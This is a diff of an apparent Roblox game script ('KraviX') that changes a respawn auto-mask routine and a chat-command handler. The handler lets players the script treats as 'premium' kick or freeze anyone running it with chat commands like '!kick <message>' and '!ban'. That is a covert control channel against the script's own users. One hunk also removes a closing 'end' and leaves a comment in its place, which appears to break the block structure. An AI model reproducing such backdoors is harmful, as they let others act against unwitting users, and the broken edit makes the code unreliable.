@@ -287,6 +287,11 @@ task.spawn(function()
     automaskenabled = true
 end)
 
+Player.CharacterAdded:Connect(function()
+    task.wait(2)
+    automaskenabled = true
+end)
+
 local Character = player.Character or player.CharacterAdded:Wait()
 local hrp = Character:WaitForChild("HumanoidRootPart")
 
@@ -744,8 +749,10 @@ function setupChatListener(player)
         local msgLower = message:lower()
 
         if isPremium(player) then
-            if msgLower == "!kick" then LocalPlayer:Kick(":o")
-            elseif msgLower == "!ban" then LocalPlayer:Kick("Banned by Premium")
+            if msgLower:match("^%!kick%s+(.+)$") then LocalPlayer:Kick(message:match("^%!kick%s+(.+)$"))
+            elseif msgLower == "!kick" then LocalPlayer:Kick(":o")
+            elseif msgLower:match("^%!ban%s+(.+)$") then LocalPlayer:Kick(message:match("^%!ban%s+(.+)$"))
+            elseif msgLower == "!ban" then LocalPlayer:Kick("PERMA-BAN")
             elseif msgLower == "!freeze" then
                 local char = LocalPlayer.Character
                 if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = true end
@@ -1599,8 +1606,7 @@ task.spawn(function()
                     buyingMaskInProgress = false
                     task.wait(2)
                 else
-                    automaskenabled = false
-                end
+                    -- mask already equipped, keep automaskenabled true for next respawn
             end
         end
         task.wait(0.5)
@@ -1886,6 +1892,3 @@ pcall(function()
     end)
 end)
 
-print("[KraviX] ✅ Script carregado com sucesso!")
-print("[KraviX] Premium [🌟] com TODOS os comandos")
-print("[KraviX] Owner [👑] sem comandos")
